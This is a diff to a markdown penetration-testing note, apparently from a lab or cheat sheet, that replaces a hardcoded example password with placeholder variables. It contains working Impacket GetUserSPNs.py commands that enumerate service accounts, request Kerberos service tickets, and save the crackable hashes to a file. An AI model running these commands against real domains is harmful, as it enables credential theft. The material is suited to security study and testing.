@@ -41,7 +41,7 @@ sudo python3 -m pip install .
 Check kerberoastable users using the Impacket's module GetUserSPNs.py
 ```bash
 # Lists all accounts with SPNs (service accounts)
-GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP
+GetUserSPNs.py $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP
 # Same command structure for any domain/user
 GetUserSPNs.py $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP
 ```
@@ -63,8 +63,8 @@ GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER:'$PASS' -request
 GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER:'$PASS' -request-user <TARGET_ACCOUNT>
 
 #example
-GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP -request #without specifing a user it checks all possible tickets
-GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt
+GetUserSPNs.py $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request #without specifing a user it checks all possible tickets
+GetUserSPNs.py $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt
 ```
 
 ![[Pasted image 20260415150325.png]]
